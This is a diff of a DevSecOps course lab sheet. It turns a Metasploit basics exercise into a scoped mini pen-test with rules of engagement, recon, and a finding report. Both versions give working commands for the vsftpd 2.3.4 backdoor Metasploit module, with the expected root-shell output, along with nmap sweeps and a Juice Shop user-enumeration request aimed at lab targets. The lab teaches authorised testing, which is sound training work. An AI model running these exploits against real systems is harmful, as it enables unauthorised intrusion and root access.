@@ -1,6 +1,6 @@
-# Lab 6: Metasploit Basics
-### Run a known exploit against the lab Metasploitable target
-**DevSecOps — Module 7 of 9**
+# Lab 6: Scoped Mini Pen-Test
+### A grey-box engagement against the lab targets — recon to report
+**DevSecOps — Module 6 of 9**
 
 ---
 
@@ -8,194 +8,209 @@
 
 ### Objectives
 
-- Launch and navigate `msfconsole` (via the official Docker image on Cloud9)
-- Search, configure, and run an exploit module
-- Land a session and run basic commands as evidence
+- Read and respect a written scope and Rules of Engagement
+- Use recon, vulnerability analysis, and a single exploit step
+- Capture evidence and write a one-page finding using the report template
 
 ### Prerequisites
 
-- Lab 1 completed; `metasploitable-<your-name>` running on the `devsecops-lab` network
+- Labs 1, 2, 4 completed; targets running on your Cloud9 instance
 
-> ⏱ **Duration:** ~30 minutes
-> 👥 **Pair:** No
+> ⏱ **Duration:** ~45 minutes
+> 👥 **Pair:** Yes
 
 ---
 
-## Step 1: Start `msfconsole` (in a container)
+## Your engagement letter
 
-Run the official Metasploit image with a host-mounted workspace so you keep loot/notes after the container exits:
+> **Scope and Rules of Engagement — DevSecOps Lab 6**
+>
+> **Tester:** *(your pair)*
+>
+> **In scope:**
+> - Your own Cloud9 instance: the Metasploitable & Juice Shop containers on the `devsecops-lab` Docker network — *attacker may exploit any service exposed*
+>
+> **Out of scope:**
+> - Any **other** student's Cloud9 instance — even on the same shared AWS account
+> - The host EC2 instance (Cloud9 AMI itself)
+> - Any AWS resource outside the lab containers
+> - Denial-of-service techniques
+>
+> **Time window:** the duration of this lab session
+>
+> **Allowed techniques:** recon (`nmap`, banner grabbing), web fuzzing (within Juice Shop), single-shot exploitation modules from Metasploit
+>
+> **Prohibited techniques:** any destructive payload, lateral movement to host or AWS APIs, persistence
+>
+> **Stop conditions:** if you cannot recover the lab containers after a step, stop and notify the instructor
+>
+> **Authorising signature:** *(instructor signs at start of lab)*
+
+Read it. Initial it. **You may not exceed this scope.** Pivoting from the Metasploitable container to the Cloud9 host or to AWS APIs would constitute "out of scope" — do not attempt it.
+
+---
+
+## Step 1: Pick a target & objective (5 min)
+
+Pair, then choose **one** target and **one** objective. Examples:
+
+| Target | Objective |
+|---|---|
+| Metasploitable | Get a remote shell via a known service-level vuln |
+| Metasploitable | Read `/etc/passwd` via a vulnerable web component |
+| Juice Shop | Enumerate all admin emails via the user API |
+| Juice Shop | Demonstrate price tampering on a basket |
+
+Write your choice in `~/environment/devsecops-work/lab5-plan.md`.
+
+---
+
+## Step 2: Recon (10 min)
+
+Re-use Lab 2 outputs if you have them. Otherwise, from the Cloud9 terminal:
 
 ```bash
-mkdir -p ~/environment/devsecops-work/msf
+TARGET_IP=$(grep "Metasploitable IP" ~/devsecops-lab-env.md | awk '{print $NF}')
 
+# Service & version sweep
+nmap -Pn -sV -sC -oN ~/environment/devsecops-work/lab5-recon.txt $TARGET_IP
+
+# For Juice Shop:
+curl -sI http://localhost:3000
+```
+
+Identify **one** version-fingerprinted service likely vulnerable. Record:
+
+- Service & version
+- Why you think it's exploitable
+- Your plan in ≤ 5 bullets
+
+---
+
+## Step 3: Vulnerability analysis (10 min)
+
+Without exploiting yet, look up the vulnerability.
+
+For Metasploitable services, search Metasploit:
+
+```bash
 docker run --rm -it \
-  --name msf-${USER} \
   --network devsecops-lab \
-  -v $HOME/environment/devsecops-work/msf:/home/msf \
   metasploitframework/metasploit-framework:latest \
-  ./msfconsole -q
+  ./msfconsole -q -x "search type:exploit name:vsftpd; exit"
 ```
 
-The `-q` skips the banner. You'll land at:
+For Juice Shop, look at the OWASP Top 10 categories you covered in Lab 5.
 
-```
-msf6 >
-```
+Read the public CVE / Exploit-DB description — understand *what* the exploit does *before* running it.
 
-Useful first commands:
-
-```text
-msf6 > version            # confirm install
-msf6 > help               # cheat-sheet
-msf6 > workspace -a lab6  # tidy workspace
-```
+> ⚠️ Re-read scope before exploiting. If your plan strays, narrow it.
 
 ---
 
-## Step 2: Resolve & verify the target
+## Step 4: Exploit — *one* step (10 min)
 
-The target's network alias is `metasploitable` (set by the Lab 1 setup script):
+Run **one** carefully chosen exploit. Capture:
 
-```text
-msf6 > db_nmap -Pn -sV -p 21,22,80,139,445 metasploitable
-msf6 > hosts
-msf6 > services
+- The exact command(s)
+- The payload / request body
+- The response that proves it worked
+
+Example for Metasploitable, FTP backdoor (using the Metasploit container):
+
+```bash
+docker run --rm -it \
+  --network devsecops-lab \
+  metasploitframework/metasploit-framework:latest \
+  ./msfconsole -q -x "
+    use exploit/unix/ftp/vsftpd_234_backdoor;
+    set RHOSTS metasploitable;
+    run;
+  "
 ```
 
-Services should populate.
+Or for Juice Shop, a user enumeration:
+
+```bash
+curl -s http://localhost:3000/api/Users | jq '.data[].email' | head
+```
+
+> ✅ **Checkpoint:** you have one concrete piece of evidence that proves the issue.
 
 ---
 
-## Step 3: Pick the friendly first exploit
+## Step 5: Stop. Don't pivot. (1 min)
 
-The `vsftpd 2.3.4` daemon shipped with a known backdoor — easiest, most predictable first run.
+You proved impact. **Stop here.** Do not:
 
-```text
-msf6 > search vsftpd
-msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
-msf6 exploit(vsftpd_234_backdoor) > info
-msf6 exploit(vsftpd_234_backdoor) > show options
-```
+- Run additional modules "for fun"
+- Move laterally to the Cloud9 host or other students' instances
+- Touch AWS APIs
 
-`info` is your friend — what it does, target platforms, options that matter.
+Close any sessions you opened (`exit` from a shell, kill the Metasploit container).
 
----
-
-## Step 4: Configure & run
-
-```text
-msf6 exploit(vsftpd_234_backdoor) > set RHOSTS metasploitable
-msf6 exploit(vsftpd_234_backdoor) > check         # safe, non-exploiting probe
-msf6 exploit(vsftpd_234_backdoor) > run
-```
-
-Expected outcome:
-
-```
-[+] metasploitable:21 - Backdoor service has been spawned, handling...
-[+] metasploitable:21 - UID: uid=0(root) gid=0(root)
-[*] Found shell.
-[*] Command shell session 1 opened
-```
-
-> ✅ **Checkpoint:** you have a `Command shell session` open as `root`.
+This is the most important habit of a professional pen tester.
 
 ---
 
-## Step 5: Capture evidence
+## Step 6: Write a one-page finding (10 min)
 
-Inside the session:
-
-```text
-id
-hostname
-uname -a
-ls -la /root
-```
-
-Don't read sensitive files; this is a lab, but practise the habit.
-
-Capture by selecting → copying terminal output, paste into `~/environment/devsecops-work/lab6-evidence.txt`.
-
----
-
-## Step 6: Background and inspect the session
-
-```text
-^Z       (or type "background")
-[*] Backgrounding session 1...
-
-msf6 exploit(vsftpd_234_backdoor) > sessions
-msf6 exploit(vsftpd_234_backdoor) > sessions -i 1     # re-attach
-^Z
-msf6 exploit(vsftpd_234_backdoor) > sessions -k 1     # kill it
-```
-
-Practise these — everyday vocabulary.
-
----
-
-## Step 7: Try `local_exploit_suggester` (optional, 5 min)
-
-```text
-msf6 > sessions
-msf6 > use post/multi/recon/local_exploit_suggester
-msf6 post(local_exploit_suggester) > set SESSION 1
-msf6 post(local_exploit_suggester) > run
-```
-
-> 🛑 **Do not run any suggested escalation module.** Out of scope. The suggester is information; pivoting is not in scope.
-
----
-
-## Step 8: Lab-6 report
-
-Save `~/environment/devsecops-work/lab6-report.md`:
+Save `~/environment/devsecops-work/lab5-finding.md`:
 
 ```markdown
-# Lab 6 — Metasploit basics
+# Finding — <short title>
 
-**Tester:** <your name>
-**Target:** metasploitable (lab network)
-**Module:** exploit/unix/ftp/vsftpd_234_backdoor
+**Engagement:** DevSecOps Lab 6
+**Tester:** <pair>
+**Date:** <today>
+**Severity:** Critical | High | Medium | Low (pick one + justify)
+**OWASP / CVE:** A01 / A03 / CVE-XXXX-YYYY
+**Target:** <hostname & port or URL>
 
-## Outcome
-Session opened as root. Evidence captured.
+## Summary
+One sentence. What can the attacker do, and why does it matter?
 
-## Commands & options
-- RHOSTS = metasploitable
-- run
+## Reproduction steps
+1. ...
+2. ...
+3. ...
 
 ## Evidence
 \`\`\`
-<paste your captured terminal>
+<paste the screenshot or terminal output that proves it>
 \`\`\`
 
-## Defender's view
-- This module is detected by most modern EDR signatures
-- A patched vsftpd (≥ 2.3.5) closes the backdoor
-- An IDS rule matching the magic ":)" username trigger would catch it
+## Recommended fix
+- Concrete change in code/config
+- Tooling that would catch this earlier (SAST? SCA? Auth tests?)
+
+## Out-of-scope notes
+Things you saw but did not test, per RoE.
 ```
+
+> ✅ **Checkpoint:** the finding is reproducible by another engineer using only your write-up.
+
+---
+
+## Step 7: Cross-pair walkthrough (optional, 5 min)
+
+Pair with another team. Each tester walks the other through their finding aloud. Other team plays the developer asking "What do I actually change?"
+
+If the answer is fuzzy, sharpen the **Recommended fix** section.
 
 ---
 
 ## Cleanup
 
-```text
-msf6 > sessions -K        # kill all sessions
-msf6 > exit
-```
-
-The Metasploit container exits with `--rm`. Targets stay running.
+Targets stay running.
 
 ---
 
-## Troubleshooting
+## Common mistakes
 
-| Symptom | Fix |
+| Mistake | Why it matters |
 |---|---|
-| Container exits with "TTY required" | Make sure you used `-it` flags |
-| `Postgresql connection refused` | Inside container: `msfdb init && msfdb start` |
-| `db_nmap` says "host appears to be down" | Confirm `--network devsecops-lab` was passed |
-| Exploit `run` "completed, no session" | Re-check the alias; `ping metasploitable` from inside the container |
-| Session opens but disconnects immediately | Re-run; vsftpd backdoor occasionally needs a second attempt |
+| "I'll just try one more module" | Out of scope unless your RoE says yes |
+| Touching AWS APIs from inside the exploit | Way out of scope — could affect the shared account |
+| Running the same exploit dozens of times | Filling logs, causing instability — bad form |
+| Skipping the report | Your output **is** the report; the exploit is just a step |
